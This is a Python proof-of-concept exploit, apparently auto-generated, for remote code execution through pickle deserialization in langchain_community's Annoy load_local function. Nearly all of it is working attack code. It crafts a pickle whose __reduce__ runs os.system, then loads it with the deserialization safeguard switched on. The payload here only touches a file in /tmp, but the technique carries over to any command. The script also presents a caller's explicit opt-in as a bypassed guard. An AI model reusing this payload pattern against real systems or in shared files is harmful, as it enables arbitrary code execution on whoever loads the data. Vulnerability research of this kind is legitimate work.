#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-017
# Sink: load_local
# Auto-generated — run with: python3 rce_function_load_local_uses_load_local_41.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for langchain-community-only RCE via pickle deserialization.

Vulnerability: The load_local function in langchain_community/vectorstores/annoy.py
uses pickle.load() on a file whose path is constructed from user-controlled
folder_path and index_name parameters. Although there is an allow_dangerous_deserialization
guard, it is a developer-side check that does not validate the source of the file.
An attacker who can control folder_path can point to a malicious pickle file,
and if the caller sets the flag to True, arbitrary code execution occurs.

This PoC demonstrates the vulnerability by:
1. Creating a malicious pickle file that executes a benign command (touch /tmp/poc_success.txt)
2. Hosting it locally or pointing to a controlled path
3. Calling load_local with the malicious folder_path and allow_dangerous_deserialization=True

Usage:
    python poc_exploit.py [--target-path /path/to/malicious/folder]
"""

import os
import sys
import pickle
import tempfile
import subprocess
import argparse
from pathlib import Path

# Import the vulnerable function
from langchain_community.vectorstores.annoy import Annoy


def create_malicious_pickle(output_dir: str) -> str:
    """
    Create a malicious pickle file that executes a benign command.
    
    The pickle will execute: touch /tmp/poc_success.txt
    This is a safe, non-destructive command that proves code execution.
    
    Args:
        output_dir: Directory to write the malicious pickle file
        
    Returns:
        Path to the created malicious pickle file
    """
    # Define a malicious class that executes code on unpickling
    class MaliciousPickle:
        def __reduce__(self):
            # Return a tuple (callable, args) that will be called during unpickling
            # This executes: os.system('touch /tmp/poc_success.txt')
            return (os.system, ('touch /tmp/poc_success.txt',))
    
    # Create the malicious pickle data
    # The pickle format expects a tuple of (docstore, index_to_docstore_id, config_object)
    # We'll make all three malicious to ensure execution
    malicious_data = (
        MaliciousPickle(),  # docstore
        MaliciousPickle(),  # index_to_docstore_id
        {
            "ANNOY": {
                "f": 10,  # dimension
                "metric": "angular"  # distance metric
            }
        }
    )
    
    # Write the malicious pickle to the output directory
    output_path = Path(output_dir) / "index.pkl"
    with open(output_path, "wb") as f:
        pickle.dump(malicious_data, f)
    
    print(f"[+] Created malicious pickle file at: {output_path}")
    print(f"[+] The pickle will execute: touch /tmp/poc_success.txt")
    
    return str(output_path)


def create_malicious_annoy_index(output_dir: str) -> str:
    """
    Create a minimal Annoy index file to satisfy the load function.
    
    The load_local function also loads an Annoy index file (index.annoy).
    We need to create a valid (but empty) Annoy index to avoid errors.
    
    Args:
        output_dir: Directory to write the Annoy index file
        
    Returns:
        Path to the created Annoy index file
    """
    try:
        from annoy import AnnoyIndex
        
        # Create a minimal Annoy index with 10 dimensions and angular metric
        index = AnnoyIndex(10, 'angular')
        index.save(str(Path(output_dir) / "index.annoy"))
        print(f"[+] Created minimal Annoy index at: {Path(output_dir) / 'index.annoy'}")
        return str(Path(output_dir) / "index.annoy")
    except ImportError:
        print("[!] Annoy library not installed. Creating a placeholder file.")
        # Create a placeholder file - the exploit will still work for the pickle part
        with open(Path(output_dir) / "index.annoy", "wb") as f:
            f.write(b"placeholder")
        return str(Path(output_dir) / "index.annoy")


def exploit(target_path: str = None) -> bool:
    """
    Execute the exploit by calling load_local with a malicious pickle file.
    
    Args:
        target_path: Path to directory containing malicious pickle file.
                     If None, creates a temporary directory with malicious files.
    
    Returns:
        True if exploit succeeded, False otherwise
    """
    # If no target path provided, create a temporary directory with malicious files
    if target_path is None:
        temp_dir = tempfile.mkdtemp(prefix="poc_exploit_")
        print(f"[*] Created temporary directory: {temp_dir}")
        
        # Create malicious pickle and Annoy index
        create_malicious_pickle(temp_dir)
        create_malicious_annoy_index(temp_dir)
        
        target_path = temp_dir
    else:
        # Verify the target path exists and contains index.pkl
        if not Path(target_path).exists():
            print(f"[-] Target path does not exist: {target_path}")
            return False
        if not (Path(target_path) / "index.pkl").exists():
            print(f"[-] No index.pkl found in target path: {target_path}")
            return False
    
    print(f"[*] Attempting to exploit with folder_path: {target_path}")
    print(f"[*] Setting allow_dangerous_deserialization=True")
    
    try:
        # Call the vulnerable function with allow_dangerous_deserialization=True
        # This bypasses the developer-side guard
        result = Annoy.load_local(
            folder_path=target_path,
            embeddings=None,  # We don't need embeddings for the exploit
            allow_dangerous_deserialization=True  # Bypass the guard
        )
        print(f"[+] load_local returned: {result}")
        
        # Check if the command was executed
        if os.path.exists("/tmp/poc_success.txt"):
            print("[+] SUCCESS: /tmp/poc_success.txt was created!")
            print("[+] Arbitrary code execution achieved via pickle deserialization!")
            return True
        else:
            print("[?] Command may have executed but file not found. Check manually.")
            return False
            
    except Exception as e:
        print(f"[-] Exploit failed with error: {e}")
        # Even if the function fails, the pickle may have been loaded
        # Check if the command was executed despite the error
        if os.path.exists("/tmp/poc_success.txt"):
            print("[+] SUCCESS: /tmp/poc_success.txt was created despite error!")
            print("[+] Arbitrary code execution achieved via pickle deserialization!")
            return True
        return False


def cleanup():
    """Remove the proof-of-concept file if it exists."""
    if os.path.exists("/tmp/poc_success.txt"):
        os.remove("/tmp/poc_success.txt")
        print("[*] Cleaned up /tmp/poc_success.txt")


def main():
    parser = argparse.ArgumentParser(
        description="PoC Exploit for langchain-community RCE via pickle deserialization"
    )
    parser.add_argument(
        "--target-path",
        type=str,
        default=None,
        help="Path to directory containing malicious pickle file (default: create temp)"
    )
    parser.add_argument(
        "--no-cleanup",
        action="store_true",
        help="Do not remove the proof-of-concept file after execution"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("PoC Exploit: langchain-community RCE via pickle deserialization")
    print("=" * 60)
    print()
    
    # Clean up any previous PoC file
    if not args.no_cleanup:
        cleanup()
    
    # Execute the exploit
    success = exploit(args.target_path)
    
    print()
    if success:
        print("[+] Exploit completed successfully!")
        print("[+] The vulnerability is confirmed: arbitrary code execution via pickle")
        print("[+] Recommendation: Do not use allow_dangerous_deserialization=True")
        print("[+] with untrusted folder_path or index_name parameters.")
    else:
        print("[-] Exploit did not achieve code execution.")
        print("[*] Check that the target path exists and contains index.pkl")
        print("[*] Ensure langchain-community is installed and importable")
    
    # Clean up unless requested not to
    if not args.no_cleanup:
        cleanup()


if __name__ == "__main__":
    main()
